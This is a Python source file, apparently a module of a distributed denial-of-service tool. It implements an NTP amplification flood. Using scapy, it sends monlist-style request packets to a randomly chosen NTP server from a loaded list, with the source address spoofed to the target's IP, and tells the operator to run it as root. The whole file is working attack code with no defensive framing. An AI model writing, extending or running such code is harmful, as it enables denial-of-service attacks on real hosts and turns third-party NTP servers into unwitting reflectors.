# Import modules
import random
from pathlib import Path
from scapy.all import IP, send, Raw, UDP
from socket import gaierror
from colorama import Fore

# Load NTP servers list
_NTP_SERVERS: list[str] = []
try:
    _ntp_path = Path("tools/L4/ntp_servers.txt")
    if _ntp_path.exists():
        _NTP_SERVERS = [line.strip() for line in _ntp_path.read_text(encoding="utf-8").splitlines() if line.strip()]
except OSError as e:
    print(f"Warning: Could not load NTP servers: {e}")

# Payload
_PAYLOAD = b"\x17\x00\x03\x2a" + b"\x00" * 4


def flood(target: tuple[str, int]) -> None:
    """Send NTP amplification packets.
    
    Args:
        target: Tuple of (ip_address, port)
    """
    if not _NTP_SERVERS:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}No NTP servers available{Fore.RESET}")
        return
    
    server = random.choice(_NTP_SERVERS)
    packets = random.randint(10, 150)

    try:
        packet = (
            IP(dst=server, src=target[0])
            / UDP(sport=random.randint(2000, 65535), dport=int(target[1]))
            / Raw(load=_PAYLOAD)
        )
        send(packet, count=packets, verbose=False)
    except gaierror:
        print(
            f"{Fore.RED}[!] {Fore.MAGENTA}NTP server {server} is offline!{Fore.RESET}"
        )
    except PermissionError:
        print(
            f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
        )
    except OSError as e:
        print(
            f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending NTP: {e}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} packets from NTP server {server} to {target[0]}:{target[1]}.{Fore.RESET}"
        )
